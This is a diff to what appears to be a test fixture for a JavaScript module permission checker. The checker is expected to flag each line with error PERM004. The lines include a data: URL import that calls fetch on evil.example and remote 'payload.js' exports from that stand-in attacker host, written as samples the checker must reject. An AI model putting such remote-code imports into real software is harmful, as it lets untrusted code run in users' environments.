@@ -6,7 +6,7 @@
  * @perm env(MODE)
  */
 import "data:text/javascript,fetch('https://evil.example/')//.css"; // expect: error PERM004 unverifiable
-export * from "https://evil.example/payload.js"; // expect: error PERM004 unverifiable
+export * from "https://evil.example/a/long/path/to/the/payload/that/is/shortened/in/messages.js"; // expect: error PERM004 unverifiable
 
 export async function later() {
   return import("data:text/javascript,export default 1"); // expect: error PERM004 unverifiable
